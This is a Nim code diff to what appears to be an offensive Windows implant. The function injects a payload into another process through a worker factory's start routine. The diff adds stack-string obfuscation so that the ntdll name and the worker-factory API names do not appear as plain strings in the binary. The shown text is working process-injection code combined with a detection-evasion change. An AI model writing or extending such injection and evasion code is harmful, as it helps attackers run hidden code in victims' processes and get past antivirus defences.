@@ -2,6 +2,7 @@ import winim/lean
 
 import nimpool 
 import ../instance
+import ../utils/[stackstr]
 
 proc injectViaWorkerFactoryStartRoutine*(tProcess, hWorkerFactory: HANDLE, pPayload: pointer, szPayload: int): bool =
   var 
@@ -9,15 +10,18 @@ proc injectViaWorkerFactoryStartRoutine*(tProcess, hWorkerFactory: HANDLE, pPayl
     workerFactoryInfo: WORKER_FACTORY_BASIC_INFORMATION
     dwOldProtect: DWORD
     threadMinimumCount: int
+    sNtdll {.stackStringA.} = "NTDLL.DLL"
+    sNtSetInformationWorkerFactory {.stackStringA.} = "NtSetInformationWorkerFactory"
+    sNtQueryInformationWorkerFactory {.stackStringA.} = "NtQueryInformationWorkerFactory"
     
   # Get function pointers
   let pNtSetInformationWorkerFactory = cast[NtSetInformationWorkerFactory](
     ninst.Win32.GetProcAddress(
-        ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtSetInformationWorkerFactory")
+        ninst.Win32.GetModuleHandleA(LPCPTR(sNtdll)), LPCPTR(sNtSetInformationWorkerFactory))
   )
   let pNtQueryInformationWorkerFactory = cast[NtQueryInformationWorkerFactory](
     ninst.Win32.GetProcAddress(
-        ninst.Win32.GetModuleHandleA("NTDLL.DLL"), "NtQueryInformationWorkerFactory")
+        ninst.Win32.GetModuleHandleA(LPCPTR(sNtdll)), LPCPTR(sNtQueryInformationWorkerFactory))
   )
   if pNtQueryInformationWorkerFactory == nil or pNtSetInformationWorkerFactory == nil:
     return false
